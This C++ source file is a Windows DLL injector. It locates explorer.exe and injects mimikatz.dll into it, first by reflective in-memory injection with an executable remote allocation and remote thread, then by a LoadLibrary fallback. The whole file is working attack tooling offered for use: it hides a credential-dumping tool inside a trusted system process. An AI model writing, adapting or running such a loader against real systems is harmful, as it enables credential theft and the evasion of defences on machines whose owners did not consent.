#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

#pragma comment(lib, "Shlwapi.lib")

// ------------------- Process Discovery -------------------
DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    if (Process32First(snapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe32));
    }
    CloseHandle(snapshot);
    return pid;
}

// ------------------- DLL Buffer Loader -------------------
bool LoadFileToBuffer(const std::string& path, std::vector<char>& buffer) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return false;
    buffer = std::vector<char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    return true;
}

// ------------------- Injection Logic -------------------
bool InjectDLLBuffer(DWORD pid, const std::vector<char>& dllBuffer) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return false;

    LPVOID remoteMem = VirtualAllocEx(hProc, nullptr, dllBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProc);
        return false;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProc, remoteMem, dllBuffer.data(), dllBuffer.size(), &bytesWritten)) {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    // Reflective DLL should have shellcode-style stub at start
    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return true;
}

// ------------------- Fallback LoadLibrary Method -------------------
bool InjectViaLoadLibrary(DWORD pid, const std::string& fullPath) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return false;

    LPVOID allocMem = VirtualAllocEx(hProc, nullptr, fullPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!allocMem) {
        CloseHandle(hProc);
        return false;
    }

    WriteProcessMemory(hProc, allocMem, fullPath.c_str(), fullPath.size() + 1, nullptr);
    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"),
        allocMem, 0, nullptr);

    if (!hThread) {
        VirtualFreeEx(hProc, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return true;
}

// ------------------- Main Entry -------------------
int main() {
    std::string processName = "explorer.exe";
    std::string dllPath = "mimikatz.dll";

    std::cout << "[+] Target: " << processName << "\n";
    std::cout << "[+] DLL Path: " << dllPath << "\n";

    if (!PathFileExistsA(dllPath.c_str())) {
        std::cerr << "[-] DLL file not found.\n";
        return -1;
    }

    DWORD pid = GetProcessIdByName(processName.c_str());
    if (!pid) {
        std::cerr << "[-] Target process not found.\n";
        return -2;
    }

    std::vector<char> dllBuffer;
    if (!LoadFileToBuffer(dllPath, dllBuffer)) {
        std::cerr << "[-] Failed to load DLL into memory.\n";
        return -3;
    }

    std::cout << "[*] Attempting Reflective Injection...\n";
    if (InjectDLLBuffer(pid, dllBuffer)) {
        std::cout << "[+] Reflective Injection succeeded!\n";
    } else {
        std::cout << "[!] Reflective Injection failed. Trying LoadLibrary fallback...\n";
        if (InjectViaLoadLibrary(pid, dllPath)) {
            std::cout << "[+] Fallback LoadLibrary injection succeeded.\n";
        } else {
            std::cerr << "[-] Both injection methods failed.\n";
            return -4;
        }
    }

    return 0;
}
